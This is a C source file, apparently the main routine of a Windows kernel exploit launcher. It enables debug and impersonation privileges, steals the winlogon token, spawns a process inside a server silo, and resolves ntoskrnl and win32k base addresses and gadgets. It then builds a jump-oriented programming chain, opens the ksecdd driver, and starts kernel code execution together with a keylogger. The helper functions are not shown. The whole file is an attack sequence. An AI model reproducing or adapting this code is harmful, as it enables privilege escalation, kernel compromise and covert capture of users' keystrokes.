#include "jop/gadgets.h"
#include "jop/jop.h"
#include "launcher/kexecdd.h"
#include "launcher/privileges.h"
#include "launcher/silo.h"
#include "utils/pipes.h"
#include <minwindef.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <winnt.h>
#include <winuser.h>

int main(void)
{
    HANDLE ksecdd_handle = nullptr;
    bool success = false;
    SiloServer *silo_server = nullptr;
    KsecReturnStruct *return_struct = nullptr;
    GadgetsData *gadgets = nullptr;
    Vec *pipes = nullptr;
    HANDLE child_pipe = {0};
    size_t ntoskrnl_base = 0, win32ksgd_base = 0, stack_address = 0;

    success = privs_enable_privilege(SE_DEBUG_NAME);
    if (success == false)
        return -1;

    success = privs_enable_privilege(SE_IMPERSONATE_NAME);
    if (success == false)
        return -1;

    success = privs_steal_winlogon_token();
    if (success == false)
        return -1;

    success = silo_create_server(&silo_server);
    if (success == false)
        return -1;

    success = privs_revert_impersonation();
    if (success == false)
        return -1;

    success = pipes_create(&pipes);
    if (success == false)
        return -1;

    success = silo_spawn_new_process(pipes, silo_server, &child_pipe);
    if (success == false)
        return -1;

    success = gadgets_get_ntosknrl_base_address(
        &ntoskrnl_base,
        &win32ksgd_base,
        &stack_address,
        child_pipe
    );
    if (success == false)
        return -1;

    success = gadgets_resolve_all_gadgets(
        ntoskrnl_base,
        stack_address,
        win32ksgd_base,
        &gadgets,
        child_pipe
    );
    if (success == false)
        return -1;

    success = jop_build_jop_chain(pipes, gadgets, &return_struct, child_pipe);
    if (success == false)
        return -1;

    success = kexec_get_driver_handle(&ksecdd_handle, child_pipe);
    if (success == false)
        return -1;

    success = kexec_connect(ksecdd_handle, child_pipe);
    if (success == false)
        return -1;

    success = kexec_start_jop_and_key_log(pipes, ksecdd_handle, child_pipe, return_struct);
    if (success == false)
        return -1;
}
